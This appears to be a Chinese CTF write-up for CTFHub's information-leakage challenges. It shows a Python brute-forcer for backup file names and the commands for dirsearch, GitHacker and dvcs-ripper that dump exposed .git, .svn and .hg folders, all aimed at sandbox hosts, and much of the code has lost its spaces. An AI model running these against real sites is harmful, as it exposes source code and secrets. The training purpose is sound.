先放上系统链接：https://www.ctfhub.com/#/skilltree

### 信息泄露

#### 目录遍历

点点点

可以记录一下操作系统重要目录

    
    
    ctfhub{218324b2f2eb1e64848dfba3}

#### PHPINFO

在php配置文件phpinfo里面，通常可以获得很多信息，包括文件路径等等

#### 备份文件下载

##### 网址源码

这里写python脚本跑最快

    
    
    importrequests  
    url="http://challenge-176d82a5e0556867.sandbox.ctfhub.com:10800/"  
    back1=['web','website','backup','back','www','wwwroot','temp']  
    back2=['tar','tar.gz','zip','rar']  
    foriinback1:  
    forjinback2:  
    url_new=url+i+'.'+j  
    r=requests.get(url_new)  
    if(r.status_code==200):  
    print(url_new)

访问地址后自动下载www.zip

再次访问

    
    
    http://challenge-176d82a5e0556867.sandbox.ctfhub.com:10800/flag_1159714308.txt

##### bak文件

    
    
    index.php.bak

index.php+bak文件，提示得很明显了。

    
    
    challenge-4d9f30088e215cad.sandbox.ctfhub.com:10800/index.php.bak

##### vim缓存

    
    
    .index.php.swp

##### .DS_Store

    
    
    /.DS_Store

##### 文件找到flag，就去url里面找

#### Git泄露

 **Dirsearch**

Github里面搜Dirsearch就有

    
    
    python3dirsearch.py-uurl

 **GitHacker**

    
    
     pip3installGitHacker
    
    
    # quick start  
    githacker --url http://127.0.0.1/.git/ --output-folder result  
    # brute for the name of branchs / tags  
    githacker --brute --url http://127.0.0.1/.git/ --output-folder result

##### Log

    
    
    gitlog
    
    
    gitreset --hard4e91c3d9f2308e4ce3479c5c90cc12bdf51c193a

get flag

    
    
    或者  
    gitshow

##### Stash

    
    
    python GitHack.py http://xxx:xxx/.git/
    
    
    git stash list  
    git stash pop

##### Index

    
    
    githacker--urlhttp://xxx:xxx/.git/--output-foldercos
    
    
    gitlog  
    gitdiff
    
    
    git show

#### SVN泄露

下载工具

    
    
    git clone https://github.com/kost/dvcs-ripper

进行简单配置相关要求的组件

    
    
    sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl
    
    
    ./rip-svn.pl -v -u http://challenge-760dd8b8726e187c.sandbox.ctfhub.com:10800/.svn/

找找就能get flag

#### HG泄露

    
    
    ./rip-hg.pl -v -u http://challenge-74b2c82fa88a1488.sandbox.ctfhub.com:10800/.hg/

查找下下来的文件，一定要ls -al看，ls是看不到的

get flag

ctfhub的技能树确实不赖，大家都可以去完善一下知识体系

